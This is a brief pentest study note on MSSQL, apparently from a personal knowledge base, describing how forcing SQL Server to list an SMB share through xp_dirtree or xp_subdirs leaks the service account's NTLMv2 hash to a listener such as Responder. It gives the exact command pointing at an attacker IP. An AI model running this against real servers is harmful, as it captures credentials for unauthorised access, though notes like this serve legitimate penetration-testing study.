---
tags:
  - Enumeration
  - TCP
  - MSSQL
  - Concepts
---

We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. 

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

1. Start [[1. Responder|Responder]]
2. Cost:
```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```